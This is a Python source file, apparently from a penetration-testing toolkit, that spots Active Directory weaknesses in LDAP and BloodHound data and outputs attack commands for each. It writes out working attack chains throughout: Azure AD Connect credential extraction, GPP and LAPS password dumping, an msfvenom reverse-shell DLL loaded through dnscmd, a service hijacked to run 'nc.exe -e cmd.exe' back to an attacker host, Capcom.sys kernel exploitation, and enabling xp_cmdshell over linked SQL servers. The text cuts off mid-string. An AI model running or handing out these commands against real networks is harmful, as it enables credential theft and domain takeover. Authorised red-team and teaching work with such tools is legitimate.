"""
Attack Vector Detection Framework

Detects specific attack opportunities from enumeration data and suggests
exploitation steps with educational context.

Supports detection from:
- LDAP enumeration data
- BloodHound/Neo4j data
- Local system enumeration

Each detector provides:
- Detection logic (what to look for)
- Confidence scoring
- Exploitation commands
- Educational explanations

Example:
    detector = AzureADConnectDetector()
    result = detector.detect_from_ldap(users_data)

    if result:
        print(f"Detected: {result.indicator}")
        for cmd in result.attack_commands:
            print(f"  {cmd}")
"""

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional


class DetectionConfidence(Enum):
    """Confidence level in detection."""
    CONFIRMED = "confirmed"  # Strong evidence, high confidence
    LIKELY = "likely"        # Good evidence, needs verification
    POSSIBLE = "possible"    # Weak evidence, investigate further


@dataclass
class AttackCommand:
    """
    Single attack command with context.

    Provides the command AND explains why it works,
    supporting both automation and learning.
    """
    command: str
    description: str
    explanation: str          # WHY this works (educational)
    prerequisites: List[str] = field(default_factory=list)  # What you need first
    alternatives: List[str] = field(default_factory=list)   # Other ways to do this
    references: List[str] = field(default_factory=list)     # URLs for learning


@dataclass
class DetectionResult:
    """
    Result from attack vector detection.

    Contains evidence, exploitation commands, and educational context.
    """
    indicator: str                    # "azure_ad_connect", "gpp", "laps", etc.
    name: str                         # Human-readable name
    confidence: DetectionConfidence
    evidence: List[str] = field(default_factory=list)  # What triggered detection
    attack_commands: List[AttackCommand] = field(default_factory=list)
    next_steps: List[str] = field(default_factory=list)  # What to do next
    references: List[str] = field(default_factory=list)  # URLs for research

    def __bool__(self) -> bool:
        """Result is truthy if detection was positive."""
        return len(self.evidence) > 0


class DetectorBase(ABC):
    """
    Abstract base for attack vector detectors.

    Each detector looks for specific attack opportunities and provides
    exploitation guidance with educational context.
    """

    @property
    @abstractmethod
    def indicator_name(self) -> str:
        """Unique identifier for this attack vector."""
        pass

    @property
    @abstractmethod
    def display_name(self) -> str:
        """Human-readable name."""
        pass

    @property
    @abstractmethod
    def description(self) -> str:
        """Brief description of what this detects."""
        pass

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """
        Detect from LDAP enumeration data.

        Override in subclasses that support LDAP detection.

        Args:
            users: List of user dicts with name, upn, description, etc.
            groups: List of group dicts with name, members
            computers: List of computer dicts
            context: Additional context (target_ip, domain, etc.)

        Returns:
            DetectionResult if detected, None otherwise
        """
        return None

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """
        Detect from BloodHound/Neo4j data.

        Override in subclasses that support BloodHound detection.

        Args:
            neo4j_session: Active Neo4j session
            context: Additional context

        Returns:
            DetectionResult if detected, None otherwise
        """
        return None

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        """
        Get exploitation commands for this attack vector.

        Override to provide attack-specific commands.

        Args:
            context: Target info (ip, domain, credentials, etc.)

        Returns:
            List of AttackCommand objects
        """
        return []


class AzureADConnectDetector(DetectorBase):
    """
    Detect Azure AD Connect installation.

    Azure AD Connect syncs on-prem AD to Azure AD. The sync account
    credentials are stored in a SQL database and can be extracted
    by members of ADSyncAdmins or local admins on the AAD Connect server.

    Detection indicators:
    - Accounts starting with AAD_ or MSOL_
    - ADSyncAdmins, Azure Admins groups
    - Microsoft Azure AD Sync in installed programs
    """

    # Account patterns indicating Azure AD Connect
    SYNC_ACCOUNT_PATTERNS = ['AAD_', 'MSOL_']

    # Groups that indicate Azure AD presence
    AZURE_GROUPS = [
        'ADSyncAdmins',
        'ADSyncOperators',
        'ADSyncBrowse',
        'ADSyncPasswordSet',
        'Azure Admins',
    ]

    @property
    def indicator_name(self) -> str:
        return "azure_ad_connect"

    @property
    def display_name(self) -> str:
        return "Azure AD Connect"

    @property
    def description(self) -> str:
        return "Azure AD Connect syncs on-prem AD to Azure. Credentials can be extracted."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """Detect Azure AD Connect from LDAP user/group data."""
        evidence = []

        # Check for sync accounts (AAD_, MSOL_)
        for user in users:
            name = (user.get('name') or '').upper()
            upn = (user.get('upn') or '').upper()

            for pattern in self.SYNC_ACCOUNT_PATTERNS:
                if name.startswith(pattern) or upn.startswith(pattern):
                    evidence.append(f"Sync account found: {user.get('name', name)}")
                    break

        # Check for Azure-related groups
        for group in groups:
            group_name = group.get('name') or ''
            for azure_group in self.AZURE_GROUPS:
                if azure_group.lower() in group_name.lower():
                    evidence.append(f"Azure group found: {group_name}")
                    members = group.get('members', [])
                    if members:
                        evidence.append(f"  Members: {', '.join(members[:5])}")

        if not evidence:
            return None

        # Determine confidence
        has_sync_account = any('Sync account' in e for e in evidence)
        has_azure_group = any('Azure group' in e for e in evidence)

        if has_sync_account and has_azure_group:
            confidence = DetectionConfidence.CONFIRMED
        elif has_sync_account:
            confidence = DetectionConfidence.LIKELY
        else:
            confidence = DetectionConfidence.POSSIBLE

        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=confidence,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Identify the server running Azure AD Connect",
                "Check if current user is member of ADSyncAdmins or local admin",
                "Extract credentials using ADSync decryption",
            ],
            references=[
                "https://blog.xpnsec.com/azuread-connect-for-redteam/",
                "https://github.com/fox-it/adconnectdump",
                "https://www.dsinternals.com/en/dumping-azure-ad-connect-credentials/",
            ],
        )

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """Detect Azure AD Connect from BloodHound data."""
        evidence = []

        # Query for AAD/MSOL accounts
        query_sync = """
        MATCH (u:User)
        WHERE u.name STARTS WITH 'AAD_' OR u.name STARTS WITH 'MSOL_'
        RETURN u.name AS name, u.description AS description
        LIMIT 10
        """

        try:
            result = neo4j_session.run(query_sync)
            for record in result:
                name = record.get('name') or ''
                desc = record.get('description') or ''
                evidence.append(f"Sync account: {name}")
                if desc:
                    evidence.append(f"  Description: {desc}")
        except Exception:
            pass

        # Query for Azure-related groups
        query_groups = """
        MATCH (g:Group)
        WHERE g.name CONTAINS 'AZURE' OR g.name CONTAINS 'ADSYNC'
        OPTIONAL MATCH (u:User)-[:MemberOf*1..]->(g)
        RETURN g.name AS group_name, collect(DISTINCT u.name)[..5] AS members
        """

        try:
            result = neo4j_session.run(query_groups)
            for record in result:
                group_name = record.get('group_name') or ''
                members = record.get('members') or []
                evidence.append(f"Azure group: {group_name}")
                if members:
                    # Filter out None values from members list
                    valid_members = [m for m in members if m]
                    if valid_members:
                        evidence.append(f"  Members: {', '.join(valid_members)}")
        except Exception:
            pass

        if not evidence:
            return None

        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.LIKELY,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Check if pwned user is member of ADSyncAdmins",
                "Identify Azure AD Connect server",
                "Run credential extraction",
            ],
            references=[
                "https://blog.xpnsec.com/azuread-connect-for-redteam/",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        """Get Azure AD Connect exploitation commands."""
        target = context.get('target_ip', '<DC_IP>')
        domain = context.get('domain', '<DOMAIN>')
        dc_hostname = context.get('dc_hostname', 'YOURDC')

        commands = [
            AttackCommand(
                command=f"# Step 1: Check if ADSync database is accessible",
                description="Query ADSync configuration",
                explanation="Azure AD Connect stores sync credentials in a SQL database (ADSync). "
                           "Local Admins or ADSyncAdmins can query this database.",
                prerequisites=["Local admin or ADSyncAdmins membership on AAD Connect server"],
            ),
            AttackCommand(
                command=f'sqlcmd -S {dc_hostname} -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"',
                description="Extract encryption parameters from ADSync",
                explanation="The encryption keys (entropy, instance_id, keyset_id) are needed "
                           "to decrypt the stored credentials using DPAPI.",
                prerequisites=["Access to the ADSync SQL database"],
                alternatives=[
                    f'sqlcmd -S localhost\\ADSync -Q "..."  # LocalDB instance',
                ],
            ),
            AttackCommand(
                command=f'sqlcmd -S {dc_hostname} -Q "use ADsync; SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = \'AD\'"',
                description="Extract encrypted credentials",
                explanation="The encrypted_configuration contains the sync account password, "
                           "encrypted with DPAPI using the keys from mms_server_configuration.",
            ),
            AttackCommand(
                command="# Step 2: Decrypt credentials using xpn's script or AdDecrypt.exe",
                description="Decrypt the extracted credentials",
                explanation="Microsoft's published DPAPI mechanism allows decryption with the "
                           "entropy and keyset values. Tools like ADConnect.ps1 automate this.",
                references=[
                    "https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545",
                    "https://github.com/fox-it/adconnectdump",
                ],
                alternatives=[
                    "python3 adconnectdump.py -dc-ip {target} {domain}/user:pass",
                    "AdDecrypt.exe -FullSQL",
                ],
            ),
            AttackCommand(
                command=f"evil-winrm -i {target} -u administrator -p '<DECRYPTED_PASSWORD>'",
                description="Connect with extracted Domain Admin credentials",
                explanation="The sync account is often the default Domain Administrator, "
                           "granting full domain control upon credential extraction.",
            ),
        ]

        return commands


class GPPPasswordDetector(DetectorBase):
    """
    Detect Group Policy Preferences (GPP) with cpassword.

    GPP passwords (MS14-025) are encrypted with a publicly known AES key.
    Found in SYSVOL under Policies/{GUID}/Machine/Preferences/Groups/Groups.xml
    """

    @property
    def indicator_name(self) -> str:
        return "gpp_password"

    @property
    def display_name(self) -> str:
        return "GPP cpassword (MS14-025)"

    @property
    def description(self) -> str:
        return "Group Policy Preferences store passwords encrypted with a public key."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """GPP detection requires SYSVOL access, not LDAP."""
        # This would be detected by SMB crawler finding Groups.xml
        # Return suggestion to check SYSVOL
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.POSSIBLE,
            evidence=["SYSVOL share should be checked for GPP files"],
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Access SYSVOL share",
                "Search for Groups.xml, Services.xml, ScheduledTasks.xml",
                "Decrypt cpassword values",
            ],
            references=[
                "https://adsecurity.org/?p=2288",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        target = context.get('target_ip', '<DC_IP>')
        user = context.get('username', '<USER>')
        password = context.get('password', '<PASS>')

        return [
            AttackCommand(
                command=f"crackmapexec smb {target} -u '{user}' -p '{password}' -M gpp_password",
                description="Auto-find and decrypt GPP passwords",
                explanation="CrackMapExec's gpp_password module searches SYSVOL for "
                           "cpassword values and decrypts them automatically.",
            ),
            AttackCommand(
                command=f"findstr /S /I cpassword \\\\{target}\\sysvol\\*.xml",
                description="Manual search for cpassword in SYSVOL",
                explanation="Search all XML files in SYSVOL for the cpassword attribute.",
            ),
            AttackCommand(
                command="gpp-decrypt <CPASSWORD>",
                description="Decrypt cpassword value",
                explanation="Microsoft published the AES key used for GPP encryption, "
                           "making decryption trivial with tools like gpp-decrypt.",
            ),
        ]


class LAPSDetector(DetectorBase):
    """
    Detect LAPS (Local Administrator Password Solution) deployment.

    LAPS stores unique local admin passwords in AD. Users with read access
    to ms-Mcs-AdmPwd attribute can retrieve these passwords.
    """

    @property
    def indicator_name(self) -> str:
        return "laps"

    @property
    def display_name(self) -> str:
        return "LAPS (Local Admin Passwords)"

    @property
    def description(self) -> str:
        return "LAPS stores local admin passwords in AD - check read permissions."

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        """Detect LAPS from BloodHound data."""
        evidence = []

        # Check for computers with LAPS
        query = """
        MATCH (c:Computer)
        WHERE c.haslaps = true
        RETURN c.name AS computer
        LIMIT 20
        """

        try:
            result = neo4j_session.run(query)
            computers = [r['computer'] for r in result]
            if computers:
                evidence.append(f"LAPS enabled on {len(computers)} computers")
                evidence.append(f"Examples: {', '.join(computers[:5])}")
        except Exception:
            pass

        if not evidence:
            return None

        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Check who can read ms-Mcs-AdmPwd attribute",
                "Target computers where pwned user has LAPS read access",
            ],
            references=[
                "https://www.yourteacher.io/laps-password-dumping/",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        target = context.get('target_ip', '<DC_IP>')
        user = context.get('username', '<USER>')
        password = context.get('password', '<PASS>')
        domain = context.get('domain', '<DOMAIN>')

        return [
            AttackCommand(
                command=f"crackmapexec ldap {target} -u '{user}' -p '{password}' -M laps",
                description="Dump LAPS passwords for readable computers",
                explanation="If your user has GenericAll or ReadLAPSPassword on a computer, "
                           "you can retrieve its local admin password from AD.",
            ),
            AttackCommand(
                command=f"ldapsearch -x -H ldap://{target} -D '{user}@{domain}' -w '{password}' -b 'DC=<DOMAIN>,DC=LOCAL' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd",
                description="Manual LDAP query for LAPS passwords",
                explanation="Query the ms-Mcs-AdmPwd attribute directly via LDAP. "
                           "Replace DC=<DOMAIN>,DC=LOCAL with your actual domain base DN.",
            ),
        ]


class DnsAdminsDetector(DetectorBase):
    """
    Detect membership in the DnsAdmins group.

    DnsAdmins can instruct the DNS service (running as SYSTEM on DCs) to load
    an arbitrary DLL via dnscmd. Restarting DNS executes the DLL as SYSTEM.

    Reference: https://adsecurity.org/?p=4064
               https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
    """

    @property
    def indicator_name(self) -> str:
        return "dnsadmins"

    @property
    def display_name(self) -> str:
        return "DnsAdmins Group Membership"

    @property
    def description(self) -> str:
        return "DnsAdmins can load arbitrary DLLs via DNS service - SYSTEM on DC."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        for group in groups:
            name = group.get('name') or ''
            if name.lower() == 'dnsadmins':
                evidence.append(f"DnsAdmins group found: {name}")
                members = group.get('members', [])
                if members:
                    evidence.append(f"  Members: {', '.join(members[:10])}")
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Stage a reverse-shell DLL on an SMB share reachable from the DC",
                "Configure the DNS plugin path via dnscmd",
                "Restart the DNS service to trigger DLL load as SYSTEM",
            ],
            references=[
                "https://adsecurity.org/?p=4064",
                "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
            ],
        )

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        query = """
        MATCH (u)-[:MemberOf*1..]->(g:Group)
        WHERE g.name =~ '(?i)DNSADMINS@.*'
        RETURN u.name AS member, g.name AS group_name
        LIMIT 20
        """
        try:
            result = neo4j_session.run(query)
            for record in result:
                member = record.get('member') or ''
                group_name = record.get('group_name') or ''
                evidence.append(f"{member} -> {group_name}")
        except Exception:
            pass
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Verify DNS service is running on target DC",
                "Confirm SMB write access for DLL staging",
            ],
            references=[
                "https://adsecurity.org/?p=4064",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        lhost = context.get('lhost', '<LHOST>')
        dc = context.get('dc_hostname', '<DC_HOSTNAME>')
        return [
            AttackCommand(
                command=f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT=443 -f dll -o dns_plugin.dll",
                description="Generate reverse-shell DLL payload",
                explanation="The DNS service loads the plugin DLL as SYSTEM. A reverse-shell "
                            "DLL gives immediate SYSTEM-level access on the domain controller.",
                prerequisites=["Network access to stage DLL via SMB share"],
                references=["https://github.com/rapid7/metasploit-framework"],
            ),
            AttackCommand(
                command=f"dnscmd {dc} /config /serverlevelplugindll \\\\{lhost}\\share\\dns_plugin.dll",
                description="Register malicious DLL with DNS service",
                explanation="dnscmd writes the plugin path to the registry key "
                            "HKLM\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll. "
                            "DnsAdmins group has write access to this key via the DNS management protocol.",
                prerequisites=["DnsAdmins group membership"],
            ),
            AttackCommand(
                command=f"sc \\\\{dc} stop dns && sc \\\\{dc} start dns",
                description="Restart DNS service to trigger DLL load",
                explanation="The DNS service loads the plugin on startup. Restarting it executes "
                            "the DLL as NT AUTHORITY\\SYSTEM, spawning the reverse shell.",
                prerequisites=["DnsAdmins group membership (allows DNS service restart)"],
                alternatives=[
                    f"net stop dns /y && net start dns  # from DC session",
                ],
            ),
        ]


class ServerOperatorsDetector(DetectorBase):
    """
    Detect membership in the Server Operators group.

    Server Operators can configure and restart services on domain controllers,
    enabling binary-path hijack to execute arbitrary code as SYSTEM.

    Reference: https://cube0x0.github.io/Pocing-Beyond-DA/
    """

    @property
    def indicator_name(self) -> str:
        return "server_operators"

    @property
    def display_name(self) -> str:
        return "Server Operators Group Membership"

    @property
    def description(self) -> str:
        return "Server Operators can modify and restart services on DCs - SYSTEM escalation."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        for group in groups:
            name = group.get('name') or ''
            if 'server operators' in name.lower():
                evidence.append(f"Group found: {name}")
                members = group.get('members', [])
                if members:
                    evidence.append(f"  Members: {', '.join(members[:10])}")
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Upload nc.exe or another reverse-shell binary to the DC",
                "Reconfigure a stopped service's binary path",
                "Start the service to execute as SYSTEM",
            ],
            references=[
                "https://cube0x0.github.io/Pocing-Beyond-DA/",
                "https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/",
            ],
        )

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        query = """
        MATCH (u)-[:MemberOf*1..]->(g:Group)
        WHERE g.name =~ '(?i)SERVER OPERATORS@.*'
        RETURN u.name AS member, g.name AS group_name
        LIMIT 20
        """
        try:
            result = neo4j_session.run(query)
            for record in result:
                member = record.get('member') or ''
                group_name = record.get('group_name') or ''
                evidence.append(f"{member} -> {group_name}")
        except Exception:
            pass
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Confirm sc.exe access to target DC",
            ],
            references=["https://cube0x0.github.io/Pocing-Beyond-DA/"],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        lhost = context.get('lhost', '<LHOST>')
        lport = context.get('lport', '<LPORT>')
        return [
            AttackCommand(
                command=f'sc config VSS binpath="C:\\\\Temp\\\\nc.exe -e cmd.exe {lhost} {lport}"',
                description="Hijack VSS service binary path to reverse shell",
                explanation="Server Operators have SC_MANAGER_ALL_ACCESS on DCs, allowing them "
                            "to reconfigure any service binary path. VSS (Volume Shadow Copy) is "
                            "typically stopped and safe to abuse without disrupting DC operations.",
                prerequisites=["nc.exe uploaded to C:\\Temp\\ on the DC", "Server Operators membership"],
                alternatives=[
                    'sc config browser binpath="C:\\\\Temp\\\\nc.exe -e cmd.exe <LHOST> <LPORT>"',
                ],
                references=["https://cube0x0.github.io/Pocing-Beyond-Da/"],
            ),
            AttackCommand(
                command="sc start VSS",
                description="Start reconfigured service to execute payload",
                explanation="Starting the service launches the hijacked binary path as "
                            "NT AUTHORITY\\SYSTEM, establishing the reverse shell.",
                prerequisites=["sc config step completed"],
            ),
        ]


class PrintOperatorsDetector(DetectorBase):
    """
    Detect membership in the Print Operators group.

    Print Operators are granted SeLoadDriverPrivilege on domain controllers,
    which allows loading unsigned kernel drivers - a direct path to kernel-mode code execution.

    Reference: https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/
               https://github.com/FuzzySecurity/Capcom-Rootkit
    """

    @property
    def indicator_name(self) -> str:
        return "print_operators"

    @property
    def display_name(self) -> str:
        return "Print Operators Group Membership"

    @property
    def description(self) -> str:
        return "Print Operators have SeLoadDriverPrivilege - can load kernel drivers on DCs."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        for group in groups:
            name = group.get('name') or ''
            if 'print operators' in name.lower():
                evidence.append(f"Group found: {name}")
                members = group.get('members', [])
                if members:
                    evidence.append(f"  Members: {', '.join(members[:10])}")
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Confirm SeLoadDriverPrivilege is active in token (whoami /priv)",
                "Use EoPLoadDriver to register a vulnerable driver (Capcom.sys)",
                "Exploit Capcom.sys for ring-0 code execution",
            ],
            references=[
                "https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/",
                "https://github.com/FuzzySecurity/Capcom-Rootkit",
            ],
        )

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        query = """
        MATCH (u)-[:MemberOf*1..]->(g:Group)
        WHERE g.name =~ '(?i)PRINT OPERATORS@.*'
        RETURN u.name AS member, g.name AS group_name
        LIMIT 20
        """
        try:
            result = neo4j_session.run(query)
            for record in result:
                member = record.get('member') or ''
                group_name = record.get('group_name') or ''
                evidence.append(f"{member} -> {group_name}")
        except Exception:
            pass
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.CONFIRMED,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Log into the DC and verify privilege with whoami /priv",
            ],
            references=["https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/"],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        return [
            AttackCommand(
                command="whoami /priv | findstr SeLoadDriverPrivilege",
                description="Verify SeLoadDriverPrivilege is present",
                explanation="Print Operators receive SeLoadDriverPrivilege on DCs. This privilege "
                            "allows registering new kernel drivers via NtLoadDriver(). It is not "
                            "present by default for interactive logons - you may need to launch a "
                            "new process as the Print Operators user.",
                prerequisites=["Session on the domain controller as a Print Operators member"],
            ),
            AttackCommand(
                command="EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Temp\\Capcom.sys",
                description="Load vulnerable Capcom.sys driver using EoPLoadDriver",
                explanation="EoPLoadDriver.exe (Tarlogic) abuses SeLoadDriverPrivilege to register "
                            "a driver service key under HKCU (writable without elevation) and call "
                            "NtLoadDriver(). Capcom.sys exposes a DeviceIoControl handler that "
                            "executes caller-supplied shellcode in ring 0, bypassing DSE on older "
                            "Windows versions.",
                prerequisites=["SeLoadDriverPrivilege in token", "Capcom.sys on disk"],
                references=[
                    "https://github.com/TarlogicSecurity/EoPLoadDriver",
                    "https://github.com/FuzzySecurity/Capcom-Rootkit",
                    "https://www.tarlogic.com/blog/seloaddriverprivilege-privesc/",
                ],
                alternatives=[
                    "# On Windows 10+: combine with DSE bypass (e.g., CI.dll TOCTOU)",
                    "# Alternative vulnerable drivers: RTCore64.sys, WinRing0x64.sys",
                ],
            ),
            AttackCommand(
                command="# Use ExploitCapcom.exe to execute SYSTEM shell via Capcom.sys IOCTL",
                description="Achieve ring-0 code execution via Capcom.sys",
                explanation="Capcom.sys IOCTL 0xAA013044 disables SMEP and executes a function "
                            "pointer in ring 0. ExploitCapcom weaponizes this to add the current "
                            "user to the local Administrators group or spawn a SYSTEM shell.",
                prerequisites=["Capcom.sys successfully loaded"],
                references=[
                    "https://github.com/tandasat/ExploitCapcom",
                ],
            ),
        ]


class MSSQLLinkedServerDetector(DetectorBase):
    """
    Detect MSSQL instances with linked server configurations.

    Linked servers allow one SQL Server instance to execute queries against another.
    If xp_cmdshell or linked-server chaining is exploitable, lateral movement
    across multiple SQL hosts is possible from a single credential.

    Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
               https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/
    """

    @property
    def indicator_name(self) -> str:
        return "mssql_linked_server"

    @property
    def display_name(self) -> str:
        return "MSSQL Linked Servers"

    @property
    def description(self) -> str:
        return "MSSQL servers with linked server configurations enable lateral movement via xp_cmdshell chains."

    def detect_from_ldap(
        self,
        users: List[Dict[str, Any]],
        groups: List[Dict[str, Any]],
        computers: List[Dict[str, Any]],
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        # MSSQLSvc SPNs on user objects indicate service accounts
        for user in users:
            spns = user.get('serviceprincipalnames') or user.get('spns') or []
            for spn in spns:
                if spn.startswith('MSSQLSvc/'):
                    evidence.append(f"MSSQL SPN on user {user.get('name', '?')}: {spn}")
        # MSSQLSvc SPNs on computer objects
        for computer in computers:
            spns = computer.get('serviceprincipalnames') or computer.get('spns') or []
            for spn in spns:
                if spn.startswith('MSSQLSvc/'):
                    evidence.append(f"MSSQL SPN on computer {computer.get('name', '?')}: {spn}")
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.LIKELY,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Enumerate linked servers on each discovered MSSQL instance",
                "Check if xp_cmdshell is enabled or can be enabled via linked server",
                "Identify service account privileges (sysadmin role?)",
            ],
            references=[
                "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server",
                "https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
            ],
        )

    def detect_from_bloodhound(
        self,
        neo4j_session,
        context: Dict[str, str],
    ) -> Optional[DetectionResult]:
        evidence = []
        query_computers = """
        MATCH (c:Computer)
        WHERE any(spn IN c.serviceprincipalnames WHERE spn STARTS WITH 'MSSQLSvc/')
        RETURN c.name AS name, c.serviceprincipalnames AS spns
        LIMIT 20
        """
        query_users = """
        MATCH (u:User)
        WHERE any(spn IN u.serviceprincipalnames WHERE spn STARTS WITH 'MSSQLSvc/')
        RETURN u.name AS name, u.serviceprincipalnames AS spns
        LIMIT 20
        """
        try:
            result = neo4j_session.run(query_computers)
            for record in result:
                name = record.get('name') or ''
                spns = [s for s in (record.get('spns') or []) if s.startswith('MSSQLSvc/')]
                evidence.append(f"MSSQL computer: {name} ({', '.join(spns[:3])})")
        except Exception:
            pass
        try:
            result = neo4j_session.run(query_users)
            for record in result:
                name = record.get('name') or ''
                spns = [s for s in (record.get('spns') or []) if s.startswith('MSSQLSvc/')]
                evidence.append(f"MSSQL service account: {name} ({', '.join(spns[:3])})")
        except Exception:
            pass
        if not evidence:
            return None
        return DetectionResult(
            indicator=self.indicator_name,
            name=self.display_name,
            confidence=DetectionConfidence.LIKELY,
            evidence=evidence,
            attack_commands=self.get_exploit_commands(context),
            next_steps=[
                "Attempt Kerberoasting on MSSQL service accounts",
                "Connect to each instance and enumerate linked servers",
            ],
            references=[
                "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server",
            ],
        )

    def get_exploit_commands(self, context: Dict[str, str]) -> List[AttackCommand]:
        target = context.get('target_ip', '<TARGET>')
        user = context.get('username', '<USER>')
        password = context.get('password', '<PASS>')
        return [
            AttackCommand(
                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"SELECT srvname FROM master..sysservers\"",
                description="Enumerate linked servers on the target MSSQL instance",
                explanation="master..sysservers lists all linked servers configured on this instance. "
                            "Each entry is a potential lateral movement target.",
                prerequisites=["Valid credentials with SQL login rights"],
                references=["https://github.com/byt3bl33d3r/CrackMapExec"],
            ),
            AttackCommand(
                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [<LINKED_SERVER>]\"",
                description="Enable advanced options on linked server",
                explanation="Executing sp_configure via AT [linked_server] runs the command in the "
                            "security context of the linked server's configured account. Enabling "
                            "advanced options is the prerequisite for activating xp_cmdshell.",
                prerequisites=["Linked server discovered", "Linked account has sysadmin or sufficient rights"],
            ),
            AttackCommand(
                command=f"crackmapexec mssql {target} -u '{user}' -p '{password}' -q \"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED_SERVER>]\"",
                description="Enable xp_cmdshell on linked server",
                explanation="xp_cmdshell spawns a Windows command shell from the SQL Server process "
                            "account. Once enabled on the linked server, arbitrary OS commands run "
